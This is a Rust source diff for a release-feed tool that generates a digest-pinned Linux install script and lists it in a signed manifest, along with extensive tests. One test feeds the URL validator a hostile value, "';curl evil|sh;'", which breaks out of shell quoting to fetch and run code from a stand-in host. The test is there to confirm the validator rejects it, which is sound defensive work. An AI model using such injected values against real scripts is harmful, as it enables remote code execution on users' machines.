@@ -20,6 +20,8 @@
 //!
 //! ```text
 //! lait-feed keygen  --out <seed-file>
+//! lait-feed digest  --file <file>
+//! lait-feed installer --version <v> --base-url <url> --artifacts-dir <dir> [--out <file>]
 //! lait-feed manifest --version <v> --base-url <url> --artifacts-dir <dir>
 //!                    --seed <file> --out <file> [--floor <v>] [--astrolabe <v>]
 //! lait-feed pointer --channel <stable|test> --version <v> --manifest-url <url>
@@ -55,6 +57,31 @@ const LAIT_TARGETS: &[(&str, &str)] = &[
     ("x86_64-apple-darwin", "tar.gz"),
     ("aarch64-unknown-linux-gnu", "tar.gz"),
     ("x86_64-unknown-linux-gnu", "tar.gz"),
+];
+
+/// The install line, before its release's coordinates are filled in.
+const INSTALLER_TEMPLATE: &str = include_str!("../../../packaging/linux/install.sh.in");
+
+/// What the install line is called on the host, in the manifest, and in the
+/// one line a person pastes. It is a release coordinate like any other:
+/// immutable under `releases/<version>/`, never a mutable object.
+const INSTALLER_NAME: &str = "install.sh";
+
+/// The bundle and artifact key the install line is listed under. `linux`
+/// rather than a triple because one script serves both Linux targets — it is
+/// the thing that picks between them. Older clients ignore the key entirely:
+/// `lait::update::feed::Manifest` carries no `deny_unknown_fields` and both
+/// of its maps are keyed lookups, so a bundle nothing asks for is invisible.
+const INSTALLER_BUNDLE: &str = "installer";
+
+/// The Linux archives the install line chooses between, and the placeholder in
+/// the template that carries each one's sha256. Adding a Linux target means
+/// adding a `case` arm to the template and a row here; the generator refuses
+/// to emit a script with a placeholder left in it, so the two cannot drift
+/// into a script that installs an unproven download.
+const INSTALLER_DIGESTS: &[(&str, &str)] = &[
+    ("x86_64-unknown-linux-gnu", "@X86_64_SHA256@"),
+    ("aarch64-unknown-linux-gnu", "@AARCH64_SHA256@"),
 ];
 
 #[derive(Serialize)]
@@ -102,12 +129,14 @@ fn run() -> Result<()> {
     let args: Vec<String> = std::env::args().skip(1).collect();
     match args.first().map(String::as_str) {
         Some("keygen") => keygen(&args[1..]),
+        Some("digest") => digest(&args[1..]),
+        Some("installer") => installer(&args[1..]),
         Some("manifest") => manifest(&args[1..]),
         Some("pointer") => pointer(&args[1..]),
         Some("verify") => verify(&args[1..]),
         Some("world") => world(&args[1..]),
         _ => bail!(
-            "usage: lait-feed <keygen|manifest|pointer|verify|world> ...\n\
+            "usage: lait-feed <keygen|digest|installer|manifest|pointer|verify|world> ...\n\
              see the module doc in tools/feed/src/main.rs"
         ),
     }
@@ -217,6 +246,136 @@ fn pubkey_of_seed(seed: &[u8; 32]) -> Result<[u8; 32]> {
     bytes.try_into().map_err(|_| anyhow!("device key length"))
 }
 
+/// The sha256 of a file, lowercase hex — the one digest a stock Linux box can
+/// check without installing anything. Everything past the install line is
+/// proven with blake3 inside the signed manifest; this exists only so the
+/// bootstrapper's own download can be checked by `sha256sum`.
+fn sha256_file(path: &Path) -> Result<String> {
+    use sha2::Digest;
+    let bytes = fs::read(path).with_context(|| format!("read {}", path.display()))?;
+    Ok(data_encoding::HEXLOWER.encode(&sha2::Sha256::digest(&bytes)))
+}
+
+/// What a published artifact's manifest row says about a file: its blake3 and
+/// its size, in that order, on one line.
+///
+/// The manifest is the authority on every byte the feed serves, and something
+/// has to be able to ask a downloaded file whether it is what the manifest
+/// sealed. `sha256sum` is on every box; nothing is, for blake3 — so the tool
+/// that seals a release is also the one that reads a digest back, over the
+/// same `hash_file` the manifest is built from.
+fn digest(args: &[String]) -> Result<()> {
+    let path = PathBuf::from(required(args, "--file")?);
+    let (digest, size) = hash_file(&path)?;
+    println!("{digest} {size}");
+    Ok(())
+}
+
+/// The characters a base URL may carry, beyond ASCII alphanumerics.
+///
+/// Deliberately excludes the quote, the backslash and whitespace. The value is
+/// substituted into `base='…'` in the install line, where a `'` closes the
+/// quoting and everything after it is shell — and neither `leftover_placeholder`
+/// nor `sh -n` notices, because what comes out is still a valid script, just
+/// not one anybody wrote.
+const BASE_URL_PUNCTUATION: &str = "._~:/?#[]@!$&()*+,;=-";
+
+fn checked_base_url(base: &str) -> Result<&str> {
+    let trimmed = base.trim_end_matches('/');
+    let Some(rest) = trimmed
+        .strip_prefix("https://")
+        .or_else(|| trimmed.strip_prefix("http://"))
+    else {
+        bail!("--base-url {base} is not an http:// or https:// URL");
+    };
+    if rest.is_empty()
+        || !rest
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || BASE_URL_PUNCTUATION.contains(c))
+    {
+        bail!(
+            "--base-url {base} carries a character the install line cannot hold: \
+             the value is substituted inside single quotes, so a quote, a space \
+             or a backslash there stops being a URL and starts being shell"
+        );
+    }
+    Ok(trimmed)
+}
+
+/// Generate the release's install line: the one thing a person pastes.
+///
+/// The script is a release artifact like any other — immutable under
+/// `releases/<version>/`, digested in the signed manifest — so it is generated
+/// here rather than hand-maintained in the tree, where its digests would go
+/// stale silently one release after somebody forgot.
+///
+/// Deterministic for a version and a byte set: same archives, same script.
+/// That is what lets the publish script regenerate it and compare rather than
+/// trust, and what keeps a re-publish of an already-published release from
+/// colliding with its own immutable coordinate.
+fn installer(args: &[String]) -> Result<()> {
+    let version = required(args, "--version")?;
+    semver::Version::parse(&version).with_context(|| format!("--version {version}"))?;
+    let base = required(args, "--base-url")?;
+    let base = checked_base_url(&base)?;
+    let dir = PathBuf::from(required(args, "--artifacts-dir")?);
+    let out = arg(args, "--out")
+        .map(PathBuf::from)
+        .unwrap_or_else(|| dir.join(INSTALLER_NAME));
+
+    let mut script = INSTALLER_TEMPLATE
+        .replace("@VERSION@", &version)
+        .replace("@BASE_URL@", base);
+    for (target, placeholder) in INSTALLER_DIGESTS {
+        let name = format!("lait-{target}.tar.gz");
+        let path = dir.join(&name);
+        if !path.is_file() {
+            bail!(
+                "missing {} — the install line can only pin an archive it can hash, \
+                 and a box on {target} would have nothing to check its download against",
+                path.display()
+            );
+        }
+        script = script.replace(placeholder, &sha256_file(&path)?);
+    }
+    if let Some(left) = leftover_placeholder(&script) {
+        bail!(
+            "the install line still carries {left}: the template names a coordinate \
+             nothing filled in, and a script with an unsubstituted digest installs \
+             whatever it downloaded"
+        );
+    }
+
+    fs::write(&out, &script).with_context(|| format!("write {}", out.display()))?;
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::PermissionsExt;
+        fs::set_permissions(&out, fs::Permissions::from_mode(0o755))
+            .with_context(|| format!("mark {} executable", out.display()))?;
+    }
+    println!("install line written to {}", out.display());
+    println!("  curl -fsSL {base}/releases/{version}/{INSTALLER_NAME} | sudo sh");
+    Ok(())
+}
+
+/// The first `@NAME@` the template still carries, if any. Deliberately narrow:
+/// the script's own `${1+"$@"}` holds an `@`, so "contains an at sign" would
+/// refuse every honest render.
+fn leftover_placeholder(script: &str) -> Option<String> {
+    let mut rest = script;
+    while let Some(open) = rest.find('@') {
+        rest = &rest[open + 1..];
+        let name: String = rest
+            .chars()
+            .take_while(|c| c.is_ascii_uppercase() || c.is_ascii_digit() || *c == '_')
+            .collect();
+        if !name.is_empty() && rest[name.len()..].starts_with('@') {
+            return Some(format!("@{name}@"));
+        }
+    }
+    None
+}
+
 fn hash_file(path: &Path) -> Result<(String, u64)> {
     let bytes = fs::read(path).with_context(|| format!("read {}", path.display()))?;
     Ok((
@@ -274,6 +433,47 @@ fn manifest(args: &[String]) -> Result<()> {
         );
     }
     artifacts.insert("lait".to_string(), lait);
+
+    // The install line is a listed artifact, not a side file: a release whose
+    // one-line install is unlisted is a release whose install line nothing can
+    // check after the fact. `lait-feed installer` writes it into this same
+    // directory; a publish that skipped that step is refused here rather than
+    // shipping a version whose documented line 404s.
+    let installer_path = dir.join(INSTALLER_NAME);
+    if !installer_path.is_file() {
+        bail!(
+            "missing {} — run `lait-feed installer --version {version} \
+             --base-url {base} --artifacts-dir {}` first",
+            installer_path.display(),
+            dir.display()
+        );
+    }
+    // And it must be *this* version's line. `--artifacts-dir` is routinely a
+    // reused directory on the local recovery path, where the previous release's
+    // script is still sitting; sealing it would publish a version whose install
+    // line silently installs the one before it. The stamp is the same shape the
+    // stale-astrolabe-installer guard uses: name the version, or be refused.
+    let stamp = format!("version='{version}'");
+    if !String::from_utf8_lossy(&fs::read(&installer_path)?).contains(&stamp) {
+        bail!(
+            "{} does not carry {stamp}, so it is the install line for another \
+             release — regenerate it with `lait-feed installer --version {version}`",
+            installer_path.display()
+        );
+    }
+    let (digest, size) = hash_file(&installer_path)?;
+    bundles.insert(INSTALLER_BUNDLE.to_string(), version.clone());
+    artifacts.insert(
+        INSTALLER_BUNDLE.to_string(),
+        BTreeMap::from([(
+            "linux".to_string(),
+            Artifact {
+                url: format!("{base}/releases/{version}/{INSTALLER_NAME}"),
+                blake3: digest,
+                size,
+            },
+        )]),
+    );
 
     if let Some(astrolabe_version) = arg(args, "--astrolabe") {
         // One artifact per supported platform: NSIS on Windows, a signed DMG
@@ -760,6 +960,413 @@ mod tests {
         });
         fs::write(bundle.join("world.json"), declaration.to_string()).expect("a declaration");
         bundle.display().to_string()
+    }
+
+    /// A directory shaped like a finished release build: one file per lait
+    /// target, each with different bytes so a digest that names the wrong
+    /// archive is visible rather than coincidentally equal.
+    fn release_artifacts(dir: &Path) -> PathBuf {
+        let artifacts = dir.join("artifacts");
+        fs::create_dir_all(&artifacts).expect("an artifacts dir");
+        for (target, ext) in LAIT_TARGETS {
+            fs::write(
+                artifacts.join(format!("lait-{target}.{ext}")),
+                format!("the {target} host archive").as_bytes(),
+            )
+            .expect("an archive");
+        }
+        artifacts
+    }
+
+    fn generate_installer(artifacts: &Path, out: &Path) -> Result<()> {
+        installer(&[
+            "--version".into(),
+            "0.9.9".into(),
+            "--base-url".into(),
+            "https://feed.example".into(),
+            "--artifacts-dir".into(),
+            artifacts.display().to_string(),
+            "--out".into(),
+            out.display().to_string(),
+        ])
+    }
+
+    /// The install line's only job is getting one trustworthy `lait` onto the
+    /// box, and the digest baked here is the whole of that proof. A script
+    /// that carried the wrong archive's digest would refuse every honest
+    /// download; one that carried a placeholder would accept any.
+    ///
+    /// Byte-for-byte determinism is load-bearing twice over: `publish-feed.sh`
+    /// regenerates the script and compares it with the one the release build
+    /// produced instead of trusting it, and a re-publish of an already
+    /// published release must land identical bytes on an immutable coordinate.
+    #[test]
+    fn the_install_line_bakes_each_linux_archive_and_generates_the_same_bytes_twice() {
+        let dir = tempfile::tempdir().expect("a scratch dir");
+        let artifacts = release_artifacts(dir.path());
+        let first = dir.path().join("first.sh");
+        let second = dir.path().join("second.sh");
+        generate_installer(&artifacts, &first).expect("the install line generates");
+        generate_installer(&artifacts, &second).expect("and generates again");
+
+        let script = fs::read_to_string(&first).expect("the script");
+        assert_eq!(
+            script,
+            fs::read_to_string(&second).expect("the second script"),
+            "the install line is not deterministic, so a re-publish looks like new bytes"
+        );
+        for (target, placeholder) in INSTALLER_DIGESTS {
+            let digest = sha256_file(&artifacts.join(format!("lait-{target}.tar.gz")))
+                .expect("the archive digest");
+            // The pair, not the digest alone. Two arms holding each other's
+            // digest contain both strings and pass every `contains` written
+            // one at a time — and break every box, in both directions at once.
+            assert!(
+                script.contains(&format!("target='{target}'\n    digest='{digest}'")),
+                "the install line does not pin {target}'s own archive: {script}"
+            );
+            assert!(
+                !script.contains(placeholder),
+                "{placeholder} survived generation, so {target} would install an unproven download"
+            );
+        }
+        assert!(script.contains("version='0.9.9'"), "{script}");
+        assert!(script.contains("base='https://feed.example'"), "{script}");
+    }
+
+    /// The base URL is substituted into `base='…'`, and a quote there closes
+    /// the quoting: everything after it is shell in a script that still parses,
+    /// so neither the placeholder sweep nor `sh -n` would say a word.
+    #[test]
+    fn a_base_url_that_would_escape_the_script_is_refused_before_it_is_written() {
+        assert_eq!(
+            checked_base_url("https://feed.example/").expect("an honest base"),
+            "https://feed.example"
+        );
+        for hostile in [
+            "https://feed.example/';curl evil|sh;'",
+            "https://feed.example/ x",
+            "https://feed.example/\\",
+            "gs://the-foundation-dist",
+            "https://",
+        ] {
+            checked_base_url(hostile)
+                .err()
+                .unwrap_or_else(|| panic!("{hostile} was accepted into the install line"));
+        }
+    }
+
+    /// `--artifacts-dir` is routinely reused on the local recovery path, and
+    /// the previous release's `install.sh` is still sitting in it. Sealing that
+    /// publishes a version whose one-line install fetches the version before.
+    #[test]
+    fn a_manifest_refuses_an_install_line_generated_for_another_release() {
+        let dir = tempfile::tempdir().expect("a scratch dir");
+        let seed = seeded(dir.path());
+        let artifacts = release_artifacts(dir.path());
+        generate_installer(&artifacts, &artifacts.join(INSTALLER_NAME))
+            .expect("the install line generates");
+        let script = artifacts.join(INSTALLER_NAME);
+        let stale = fs::read_to_string(&script)
+            .expect("the script")
+            .replace("version='0.9.9'", "version='0.9.8'");
+        fs::write(&script, stale).expect("the previous release's line");
+
+        let error = manifest(&[
+            "--version".into(),
+            "0.9.9".into(),
+            "--base-url".into(),
+            "https://feed.example".into(),
+            "--artifacts-dir".into(),
+            artifacts.display().to_string(),
+            "--seed".into(),
+            seed,
+            "--out".into(),
+            dir.path().join("manifest.json").display().to_string(),
+        ])
+        .expect_err("a manifest must refuse another release's install line")
+        .to_string();
+        assert!(error.contains("version='0.9.9'"), "{error}");
+    }
+
+    /// An artifacts directory missing a Linux archive is a refusal, not a
+    /// script with one arm silently absent: the box that arm was for would
+    /// paste the line and be told its architecture does not exist.
+    #[test]
+    fn an_install_line_is_refused_for_an_archive_it_cannot_hash() {
+        let dir = tempfile::tempdir().expect("a scratch dir");
+        let artifacts = release_artifacts(dir.path());
+        fs::remove_file(artifacts.join("lait-aarch64-unknown-linux-gnu.tar.gz"))
+            .expect("drop the Pi's archive");
+        let error = generate_installer(&artifacts, &dir.path().join("install.sh"))
+            .expect_err("a missing Linux archive must refuse")
+            .to_string();
+        assert!(error.contains("aarch64-unknown-linux-gnu"), "{error}");
+    }
+
+    /// The script runs on whatever `/bin/sh` a Pi image shipped, before
+    /// anything of ours is on the box. A bashism here is not a style
+    /// complaint: it is an install line that fails on the machines this
+    /// feature exists for.
+    #[cfg(unix)]
+    #[test]
+    fn the_install_line_is_posix_sh_and_refuses_a_machine_it_holds_no_digest_for() {
+        use std::os::unix::fs::PermissionsExt;
+        use std::process::Command;
+
+        let dir = tempfile::tempdir().expect("a scratch dir");
+        let artifacts = release_artifacts(dir.path());
+        let script = dir.path().join("install.sh");
+        generate_installer(&artifacts, &script).expect("the install line generates");
+
+        let checked = Command::new("sh")
+            .arg("-n")
+            .arg(&script)
+            .output()
+            .expect("sh runs the syntax check");
+        assert!(
+            checked.status.success(),
+            "sh -n refused the install line: {}",
+            String::from_utf8_lossy(&checked.stderr)
+        );
+
+        let text = fs::read_to_string(&script).expect("the script");
+        for bashism in ["[[", "local ", "function ", "echo -e", "+=", "$'", "<<<"] {
+            assert!(
+                !text.contains(bashism),
+                "the install line uses {bashism}, which /bin/sh on a Pi does not have"
+            );
+        }
+
+        // A machine the release builds nothing for. Stubbing `uname` states the
+        // architecture the way a test can; `sha256sum` is stubbed only because
+        // the tool check runs first and macOS has no coreutils.
+        let stubs = dir.path().join("stubs");
+        fs::create_dir_all(&stubs).expect("a stub dir");
+        fs::write(
+            stubs.join("uname"),
+            "#!/bin/sh\ncase \"$1\" in\n-s) echo Linux ;;\n-m) echo armv7l ;;\nesac\n",
+        )
+        .expect("a uname stub");
+        fs::write(stubs.join("sha256sum"), "#!/bin/sh\nexit 0\n").expect("a sha256sum stub");
+        for stub in ["uname", "sha256sum"] {
+            fs::set_permissions(stubs.join(stub), fs::Permissions::from_mode(0o755))
+                .expect("an executable stub");
+        }
+        let path = format!(
+            "{}:{}",
+            stubs.display(),
+            std::env::var("PATH").unwrap_or_default()
+        );
+        let run = Command::new("sh")
+            .arg(&script)
+            .env("PATH", path)
+            .output()
+            .expect("sh runs the install line");
+        assert!(
+            !run.status.success(),
+            "the install line ran on an architecture it holds no digest for"
+        );
+        let said = String::from_utf8_lossy(&run.stderr);
+        assert!(
+            said.contains("armv7l") && said.contains("no host archive"),
+            "the refusal does not name the architecture: {said}"
+        );
+    }
+
+    /// A tool as the machine already has it, resolved before the stub
+    /// directory is put in front of PATH so a stub never shadows the real one.
+    #[cfg(unix)]
+    fn on_path(tool: &str) -> Option<PathBuf> {
+        std::env::split_paths(&std::env::var_os("PATH")?)
+            .map(|dir| dir.join(tool))
+            .find(|candidate| candidate.is_file())
+    }
+
+    #[cfg(unix)]
+    fn write_stub(dir: &Path, name: &str, body: &str) {
+        use std::os::unix::fs::PermissionsExt;
+        let path = dir.join(name);
+        fs::write(&path, body).expect("a stub");
+        fs::set_permissions(&path, fs::Permissions::from_mode(0o755)).expect("an executable stub");
+    }
+
+    /// The thing the install line exists to do, run rather than read: compare
+    /// what arrived against the digest baked into it, and unpack nothing until
+    /// that matches.
+    ///
+    /// The stubs state what a box would answer — `curl` serves bytes chosen
+    /// here, `tar` records that it ran instead of unpacking, and the `lait` it
+    /// drops records the arguments it was handed — but `sha256sum` is the
+    /// machine's real one. A stub that always succeeded would pass a script
+    /// that never compared anything, which is the defect this is here for.
+    /// Move the `tar` line above the comparison and the first half fails.
+    #[cfg(unix)]
+    #[test]
+    fn the_install_line_unpacks_only_what_hashes_to_the_digest_it_pins() {
+        use std::process::Command;
+
+        let dir = tempfile::tempdir().expect("a scratch dir");
+        let artifacts = release_artifacts(dir.path());
+        let script = dir.path().join("install.sh");
+        generate_installer(&artifacts, &script).expect("the install line generates");
+
+        let honest = artifacts.join("lait-x86_64-unknown-linux-gnu.tar.gz");
+        let served = dir.path().join("served");
+        let extracted = dir.path().join("extracted");
+        let installed = dir.path().join("installed");
+        let fake_lait = dir.path().join("fake-lait");
+        write_stub(
+            dir.path(),
+            "fake-lait",
+            &format!(
+                "#!/bin/sh\nprintf '%s\\n' \"$@\" > '{}'\n",
+                installed.display()
+            ),
+        );
+
+        let hasher = on_path("sha256sum")
+            .map(|tool| format!("exec {} \"$@\"", tool.display()))
+            .or_else(|| {
+                on_path("shasum").map(|tool| format!("exec {} -a 256 \"$@\"", tool.display()))
+            })
+            .expect("this machine has sha256sum or shasum");
+
+        let stubs = dir.path().join("stubs");
+        fs::create_dir_all(&stubs).expect("a stub dir");
+        write_stub(
+            &stubs,
+            "uname",
+            "#!/bin/sh\ncase \"$1\" in\n-s) echo Linux ;;\n-m) echo x86_64 ;;\nesac\n",
+        );
+        write_stub(&stubs, "sha256sum", &format!("#!/bin/sh\n{hasher}\n"));
+        write_stub(
+            &stubs,
+            "curl",
+            &format!(
+                "#!/bin/sh\nout=''\nwhile [ $# -gt 0 ]; do\n  case \"$1\" in\n    \
+                 -o) out=\"$2\"; shift 2 ;;\n    *) shift ;;\n  esac\ndone\n\
+                 [ -n \"$out\" ] || exit 2\ncp '{}' \"$out\"\n",
+                served.display()
+            ),
+        );
+        write_stub(
+            &stubs,
+            "tar",
+            &format!(
+                "#!/bin/sh\ntouch '{extracted}'\ndest=''\nprev=''\nfor a in \"$@\"; do\n  \
+                 if [ \"$prev\" = -C ]; then dest=\"$a\"; fi\n  prev=\"$a\"\ndone\n\
+                 mkdir -p \"$dest/lait-x86_64-unknown-linux-gnu\"\n\
+                 cp '{fake}' \"$dest/lait-x86_64-unknown-linux-gnu/lait\"\n",
+                extracted = extracted.display(),
+                fake = fake_lait.display()
+            ),
+        );
+
+        let path = format!(
+            "{}:{}",
+            stubs.display(),
+            std::env::var("PATH").unwrap_or_default()
+        );
+        let run = |bytes: &[u8]| {
+            fs::write(&served, bytes).expect("what the feed hands back");
+            Command::new("sh")
+                .arg(&script)
+                // `--user`: this does not run as root, and the script refuses a
+                // system install that is not — which is the point of that check.
+                .arg("--user")
+                .env("PATH", &path)
+                .output()
+                .expect("sh runs the install line")
+        };
+
+        let mut byte_off = fs::read(&honest).expect("the archive");
+        byte_off.push(b'!');
+        let refused = run(&byte_off);
+        assert!(
+            !refused.status.success(),
+            "a download that is not the pinned bytes was installed anyway"
+        );
+        let said = String::from_utf8_lossy(&refused.stderr);
+        assert!(
+            said.contains("refusing to run it"),
+            "the refusal does not say what happened: {said}"
+        );
+        assert!(
+            !extracted.exists(),
+            "tar ran on bytes the digest had not accepted"
+        );
+        assert!(
+            !installed.exists(),
+            "an unproven archive reached `lait install`"
+        );
+
+        let accepted = run(&fs::read(&honest).expect("the archive"));
+        assert!(
+            accepted.status.success(),
+            "the archive this line pins was refused: {}",
+            String::from_utf8_lossy(&accepted.stderr)
+        );
+        assert!(
+            extracted.exists(),
+            "the accepted archive was never unpacked"
+        );
+        let handed = fs::read_to_string(&installed).expect("what `lait install` was handed");
+        assert_eq!(
+            handed.split_whitespace().collect::<Vec<_>>(),
+            ["install", "--user"],
+            "the install line dropped the arguments it was piped"
+        );
+    }
+
+    /// The script is a release artifact like every other: listed in the signed
+    /// manifest, digested, immutable. A release that ships an unlisted install
+    /// line is one whose install line nothing can check after the fact.
+    #[test]
+    fn a_manifest_lists_the_install_line_and_refuses_a_release_without_one() {
+        let dir = tempfile::tempdir().expect("a scratch dir");
+        let seed = seeded(dir.path());
+        let artifacts = release_artifacts(dir.path());
+        let out = dir.path().join("manifest.json");
+        let seal_it = |dir: &Path| {
+            manifest(&[
+                "--version".into(),
+                "0.9.9".into(),
+                "--base-url".into(),
+                "https://feed.example".into(),
+                "--artifacts-dir".into(),
+                dir.display().to_string(),
+                "--seed".into(),
+                seed.clone(),
+                "--out".into(),
+                out.display().to_string(),
+            ])
+        };
+
+        let error = seal_it(&artifacts)
+            .expect_err("a release with no install line must refuse")
+            .to_string();
+        assert!(error.contains("lait-feed installer"), "{error}");
+
+        let script = artifacts.join(INSTALLER_NAME);
+        generate_installer(&artifacts, &script).expect("the install line generates");
+        seal_it(&artifacts).expect("the manifest seals");
+
+        let sealed = fs::read_to_string(&out).expect("the sealed manifest");
+        let pubkey = pubkey_of_seed(&read_seed(&seed).expect("the seed")).expect("its public key");
+        let payload = open(&sealed, &pubkey).expect("the manifest opens under its own key");
+        let manifest: serde_json::Value = serde_json::from_slice(&payload).expect("it parses");
+        assert_eq!(manifest["bundles"][INSTALLER_BUNDLE], "0.9.9");
+        let listed = &manifest["artifacts"][INSTALLER_BUNDLE]["linux"];
+        assert_eq!(
+            listed["url"],
+            format!("https://feed.example/releases/0.9.9/{INSTALLER_NAME}")
+        );
+        assert_eq!(
+            listed["blake3"].as_str(),
+            Some(hash_file(&script).expect("the script digest").0.as_str()),
+            "the manifest names a digest that is not the script's"
+        );
     }
 
     fn publish(_dir: &Path, args: &[&str]) -> Result<()> {
